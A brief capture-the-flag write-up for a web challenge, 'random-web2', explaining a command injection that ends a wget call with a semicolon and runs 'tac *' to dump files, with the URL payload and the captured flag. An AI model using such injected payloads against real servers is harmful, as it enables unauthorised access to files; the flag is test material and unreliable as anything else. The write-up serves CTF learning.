# random-web2

This one was just a simple command injection.
We put ; to end the wget command and then we do a `tac *` (reverse cat) to cat all files.
payload: `/?p=;tac+*`

flag: `CTF{fc81554fa89fdbb42a1e05f69bcdf2b4f00b10df}`